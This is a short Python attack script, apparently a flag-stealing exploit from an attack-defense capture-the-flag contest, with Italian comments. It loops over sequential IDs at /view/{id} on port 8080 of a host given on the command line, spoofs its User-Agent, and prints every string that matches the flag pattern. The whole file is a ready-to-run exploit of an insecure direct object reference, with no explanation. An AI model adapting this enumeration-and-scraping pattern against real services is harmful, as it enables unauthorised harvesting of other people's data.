#!/usr/bin/env python3
import requests
import re
import sys
import logging

# Configura il logger
logging.basicConfig(level=logging.DEBUG)

seen = []
base_url = sys.argv[1]  # Assumi che il primo argomento sia l'URL base
for a in range(700, 2000):
    #logging.debug(f"Generato URL: http://{base_url}:8080/view/{a}")
    url = f"http://{base_url}:8080/view/{a}"
    headers = {'User-Agent': 'Mozilla/5.6 Gecko'}
    try:
        response = requests.get(url, headers=headers, timeout=0.2)
        #logging.debug(f"Risposta dal server: {response.status_code}")
        if response.status_code == 200:
            matches = re.findall(r'[A-Z0-9]{31}=+', response.text)
            for match in matches:
                if match not in seen:
                    seen.append(match)
                    print(match, flush=True)
    except Exception as e:
        logging.error(f"Errore durante la richiesta all'URL {url}: {e}")
